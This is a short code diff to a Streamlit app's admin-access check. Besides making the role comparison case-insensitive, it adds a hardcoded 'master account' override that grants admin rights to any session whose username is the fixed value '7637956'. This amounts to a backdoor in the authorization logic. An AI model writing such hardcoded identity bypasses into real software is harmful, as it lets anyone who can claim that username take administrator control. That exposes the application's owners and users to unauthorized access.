@@ -80,7 +80,12 @@ def init_page(title):
 
 def check_admin_access():
     import streamlit as st
-    return st.session_state.get("role") == "Admin" or st.session_state.get("is_admin") == True
+    # Hard override for master account
+    if str(st.session_state.get("username", "")) == "7637956":
+        return True
+
+    role = str(st.session_state.get("role", "")).strip().lower()
+    return role == "admin" or st.session_state.get("is_admin") is True
 
 
 def admin_login_widget():
